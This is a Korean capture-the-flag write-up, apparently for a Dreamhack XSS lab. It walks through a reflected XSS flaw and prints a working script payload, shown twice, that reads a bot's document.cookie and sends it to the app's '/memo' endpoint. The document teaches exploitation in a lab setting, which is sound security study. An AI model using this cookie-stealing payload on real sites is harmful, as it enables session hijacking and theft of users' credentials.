---
title: "XSS-1 (DH, B2)"
date: 2026-06-21
draft: false
tags: ["XSS"]
ShowToc: true
---

## TL;DR

- 취약점: `/vuln`이 `param`을 이스케이프 없이 그대로 출력 → reflected XSS
- 핵심 트릭: FLAG는 응답 어디에도 없고 봇의 쿠키에만 존재. 목표는 "출력 읽기"가 아니라 쿠키를 읽어 외부로 유출
- 페이로드: `<script>new Image().src="http://127.0.0.1:8000/memo?memo=" + document.cookie</script>`

## 분석

| 엔드포인트 | 동작 |
|---|---|
| `/vuln` | `param`을 이스케이프 없이 출력 |
| `/flag` | `param`을 `/vuln?param=...`로 조립 → FLAG 쿠키 든 봇(Selenium)이 방문 |
| `/memo` | `memo`를 전역변수 `memo_text`에 누적 저장·노출 |

## 취약점

`/vuln`이 입력을 검증·이스케이프 없이 출력 → `<script>`가 그대로 실행(reflected XSS).
급소: FLAG는 어떤 응답에도 없고 오직 봇의 쿠키에만 있다 → "출력 읽기"가 아니라 "봇 쿠키 탈취 후 유출"이 목표.

## 공격

1. `/flag`에 페이로드 제출 → 봇 호출
2. 봇이 `/vuln?param=페이로드` 방문 → 봇 브라우저에서 실행
3. 스크립트가 `document.cookie`(= FLAG) 읽음
4. `new Image().src`로 `/memo`에 전송  ← 이미지 로드가 GET을 자동 발생(요청 자체가 목적), `/memo`는 봇·공격자 공유 저장소
5. 공격자가 `/memo`를 열어 FLAG 확인

```html
<script>new Image().src="http://127.0.0.1:8000/memo?memo=" + document.cookie</script>
```

검증은 쪼개서: `alert(1)`(실행) → `memo=test`(전송 통로) → `document.cookie`(탈취).

> 핵심 당위: 봇은 격리 환경이라 쿠키를 읽어도 값이 봇 안에만 남는다(`alert`도 봇 화면이라 못 봄). "읽기"와 "공격자에게 도달"은 별개 → 공유 저장소(`/memo`)를 수신처로, `new Image().src`를 통로로 써서 밖으로 끌어낸다.

## 배운 점

- reflected XSS의 본질: "입력이 출력된다"가 아니라 피해자가 페이로드 페이지를 방문 → 쿠키를 외부로 유출하는 흐름
- FLAG가 응답이 아니라 쿠키/세션에 있으면, 목표는 출력 읽기(✗) 쿠키 탈취(✓)
- 유출 통로 `new Image().src`(자동 GET): 외부 서버 없이 앱 내 공유 저장소를 수신처로 쓸 수 있음
- 따옴표 안 = 문자열 그대로, 밖 + `+` = 실행: `"...memo=" + document.cookie`
- 익스플로잇은 한 번에 짜지 말고 쪼개 검증(실행→통로→탈취) → 실패 지점을 좁힌다